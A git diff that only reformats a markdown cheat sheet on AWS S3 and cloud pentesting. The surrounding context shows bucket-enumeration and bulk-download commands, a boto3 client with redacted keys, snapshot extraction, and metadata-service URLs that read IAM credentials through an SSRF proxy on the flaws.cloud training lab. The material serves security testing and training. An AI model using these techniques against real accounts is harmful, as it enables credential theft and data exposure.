@@ -6,10 +6,10 @@
 - [AWS Configuration](#aws-configuration)
 - [Open Bucket](#open-bucket)
 - [Basic tests](#basic-tests)
-	- [Listing files](#listing-files)
-	- [Move a file into the bucket](move-a-file-into-the-bucket)
-	- [Download every things](#download-every-things)
-	- [Check bucket disk size](#check-bucket-disk-size)
+  - [Listing files](#listing-files)
+  - [Move a file into the bucket](move-a-file-into-the-bucket)
+  - [Download every things](#download-every-things)
+  - [Check bucket disk size](#check-bucket-disk-size)
 - [AWS - Extract Backup](#aws---extract-backup)
 - [Bucket juicy data](#bucket-juicy-data)
 
@@ -17,31 +17,32 @@
 
 - [Pacu - The AWS exploitation framework, designed for testing the security of Amazon Web Services environments](https://github.com/RhinoSecurityLabs/pacu)
 - [Bucket Finder - Search for readable buckets and list all the files in them](https://digi.ninja/)
-	```powershell
-	wget https://digi.ninja/files/bucket_finder_1.1.tar.bz2 -O bucket_finder_1.1.tar.bz2
-	./bucket_finder.rb my_words
-	./bucket_finder.rb --region ie my_words
-		US Standard         = http://s3.amazonaws.com
-		Ireland             = http://s3-eu-west-1.amazonaws.com
-		Northern California = http://s3-us-west-1.amazonaws.com
-		Singapore           = http://s3-ap-southeast-1.amazonaws.com
-		Tokyo               = http://s3-ap-northeast-1.amazonaws.com
+ ```powershell
+ wget https://digi.ninja/files/bucket_finder_1.1.tar.bz2 -O bucket_finder_1.1.tar.bz2
+ ./bucket_finder.rb my_words
+ ./bucket_finder.rb --region ie my_words
+  US Standard         = http://s3.amazonaws.com
+  Ireland             = http://s3-eu-west-1.amazonaws.com
+  Northern California = http://s3-us-west-1.amazonaws.com
+  Singapore           = http://s3-ap-southeast-1.amazonaws.com
+  Tokyo               = http://s3-ap-northeast-1.amazonaws.com
 
-	./bucket_finder.rb --download --region ie my_words
-	./bucket_finder.rb --log-file bucket.out my_words
-	```
+ ./bucket_finder.rb --download --region ie my_words
+ ./bucket_finder.rb --log-file bucket.out my_words
+ ```
+
 - [Boto3 - Amazon Web Services (AWS) SDK for Python](https://boto3.amazonaws.com/v1/documentation/api/latest/index.html)
-	```python
-	import boto3
-	# Create an S3 client
-	s3 = boto3.client('s3',aws_access_key_id='AKIAJQDP3RKREDACTED',aws_secret_access_key='igH8yFmmpMbnkcUaCqXJIRIozKVaREDACTED',region_name='us-west-1')
+ ```python
+ import boto3
+ # Create an S3 client
+ s3 = boto3.client('s3',aws_access_key_id='AKIAJQDP3RKREDACTED',aws_secret_access_key='igH8yFmmpMbnkcUaCqXJIRIozKVaREDACTED',region_name='us-west-1')
 
-	try:
-		result = s3.list_buckets()
-		print(result)
-	except Exception as e:
-		print(e)
-	```
+ try:
+  result = s3.list_buckets()
+  print(result)
+ except Exception as e:
+  print(e)
+ ```
 
 ## AWS Configuration
 
@@ -51,8 +52,8 @@ Prerequisites, at least you need awscli
 sudo apt install awscli
 ```
 
-You can get your credential here https://console.aws.amazon.com/iam/home?#/security_credential
-but you need an aws account, free tier account : https://aws.amazon.com/s/dm/optimization/server-side-test/free-tier/free_np/
+You can get your credential here <https://console.aws.amazon.com/iam/home?#/security_credential>
+but you need an aws account, free tier account : <https://aws.amazon.com/s/dm/optimization/server-side-test/free-tier/free_np/>
 
 ```javascript
 aws configure
@@ -76,7 +77,7 @@ export AWS_SESSION_TOKEN=FQoGZXIvYXdzE[...]8aOK4QU=
 
 ## Open Bucket
 
-By default the name of Amazon Bucket are like http://s3.amazonaws.com/[bucket_name]/, you can browse open buckets if you know their names
+By default the name of Amazon Bucket are like <http://s3.amazonaws.com/[bucket_name>]/, you can browse open buckets if you know their names
 
 ```bash
 http://s3.amazonaws.com/[bucket_name]/
@@ -91,7 +92,7 @@ Their names are also listed if the listing is enabled.
 <Name>adobe-REDACTED-REDACTED-REDACTED</Name>
 ```
 
-Alternatively you can extract the name of inside-site s3 bucket with `%C0`. (Trick from https://twitter.com/0xmdv/status/1065581916437585920)
+Alternatively you can extract the name of inside-site s3 bucket with `%C0`. (Trick from <https://twitter.com/0xmdv/status/1065581916437585920>)
 
 ```xml
 http://example.com/resources/id%C0
@@ -157,7 +158,7 @@ $ aws --profile flaws sts get-caller-identity
 
 
 $ aws --profile profile_name ec2 describe-snapshots
-$ aws --profile flaws  ec2 describe-snapshots --owner-id XXXX26262029 --region us-west-2    
+$ aws --profile flaws  ec2 describe-snapshots --owner-id XXXX26262029 --region us-west-2
 "SnapshotId": "snap-XXXX342abd1bdcb89",
 
 Create a volume using snapshot
@@ -183,8 +184,7 @@ http://169.254.169.254/latest/meta-data/iam/security-credentials/IAM_USER_ROLE_H
 http://169.254.169.254/latest/meta-data/iam/security-credentials/PhotonInstance
 ```
 
-For example with a proxy : http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/proxy/169.254.169.254/latest/meta-data/iam/security-credentials/flaws/
-
+For example with a proxy : <http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/proxy/169.254.169.254/latest/meta-data/iam/security-credentials/flaws/>
 
 ## Enumerate IAM permissions
 
@@ -200,9 +200,9 @@ pip install -r requirements.txt
 2019-05-10 15:58:01,537 - 21345 - [INFO] -- {
     "RoleDetailList": [
         {
-            "Tags": [], 
+            "Tags": [],
             "AssumeRolePolicyDocument": {
-                "Version": "2008-10-17", 
+                "Version": "2008-10-17",
                 "Statement": [
                     {
 ...
